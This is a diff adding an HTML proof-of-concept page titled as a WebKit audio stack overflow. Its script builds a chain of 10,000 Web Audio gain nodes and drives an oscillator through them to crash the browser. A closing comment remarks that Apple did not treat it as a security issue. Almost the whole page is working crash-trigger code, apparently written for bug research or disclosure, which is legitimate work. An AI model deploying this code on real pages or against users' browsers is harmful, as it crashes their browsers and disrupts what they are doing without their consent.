@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebKit audio stack overflow poc</title>
+</head>
+<body>
+    <h1>WebKit audio stack overflow poc</h1>
+    <button onclick="runPoC()">Trigger PoC</button>
+    <p>try crash</p>
+    <script>
+        async function runPoC() {
+            console.log("start overflow...");
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            console.log("create AudioContext");
+            const numNodes = 10000;
+            console.log(`${numNodes} nodes...`);
+            let firstNode = audioCtx.createGain();
+            let lastNode = firstNode;
+
+            for (let i = 0; i < numNodes; i++) {
+                const nextNode = audioCtx.createGain();
+                lastNode.connect(nextNode);
+                lastNode = nextNode;
+            }
+
+            console.log("Chain");
+            lastNode.connect(audioCtx.destination);
+            const osc = audioCtx.createOscillator();
+            osc.connect(firstNode);
+            console.log("pull() logic "); //remote audio proxy
+            osc.start();
+
+            if (audioCtx.state === 'suspended') { /// web audio processing starts when context is resumed or on interaction so resume now
+                await audioCtx.resume();
+            }
+            console.log("done. no crash? then this might be patched even though apple said it's not a security issue 💀");
+        }
+    </script>
+</body>
+</html>
